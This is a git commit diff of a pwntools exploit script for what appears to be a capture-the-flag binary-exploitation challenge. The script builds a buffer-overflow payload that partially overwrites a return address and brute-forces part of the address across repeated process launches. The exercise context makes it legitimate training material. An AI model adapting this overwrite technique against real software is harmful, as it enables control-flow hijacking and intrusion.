b1e04661fec7947748e6952b987310de96b050b2
jbelkerf <jbelkerf@gmail.com>
2025-09-11 13:27:23 +0100

    sync

--- pwn/hard_string_length/exp.py
+++ pwn/hard_string_length/exp.py
@@ -1,12 +1,13 @@
 from pwn import *
 
-offset = 72 + 8
+offset = 80
 win_bypass = 0x1704
+save_addr = 0x19d4
 main_addre = 0x194e
 
 for i in "0123456789abcdef":
     r = process("/challenge/binary-exploitation-null-write")
-    payload = offset * b'\0' + b'\x04' + bytes.fromhex(f"{i}7")
+    payload = 4 * b'A' + (offset - 4) * b'\0' + b'\xd4' #+ bytes.fromhex(f"{i}9")
     r.send(payload)
     # r.interactive()
     print(r.recvline())
